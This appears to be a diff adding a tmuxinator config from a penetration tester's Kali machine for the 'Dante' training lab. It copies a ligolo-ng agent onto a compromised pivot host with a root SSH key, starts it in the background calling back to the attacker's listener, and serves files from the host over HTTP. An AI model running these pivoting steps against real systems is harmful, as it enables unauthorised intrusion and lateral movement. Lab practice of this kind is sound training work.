@@ -1,0 +1,26 @@
+# /home/kali/.config/tmuxinator/dantePH1.yaml.yml
+
+name: dantePH1
+root: ~/
+startup_window: ligolo
+
+windows:
+  - PH 1:
+      root: ~/
+      layout: even-vertical
+      panes:
+        - Pivot Host1:
+          - cl
+          - sleep 15
+          - cd Data/NIX01-172.16.1.100
+          - scp -i id_rsa /home/kali/Desktop/LinuxTools/agent root@10.10.110.100:/tmp/my_agent
+          - #scp -i id_rsa /home/kali/Desktop/WindowsTools/agent.exe root@10.10.110.100:/tmp/my_agent.exe
+          - ssh -i id_rsa root@10.10.110.100 "nohup /tmp/my_agent -connect $myip:11601 -ignore-cert &"
+        - Pivot Host1 WebServer:
+          - cl
+          - sleep 15
+          - cd Data/NIX01-172.16.1.100
+          - ssh -i id_rsa root@10.10.110.100
+          - sleep 5
+          - cd /tmp
+          - python3 -m http.server 9000
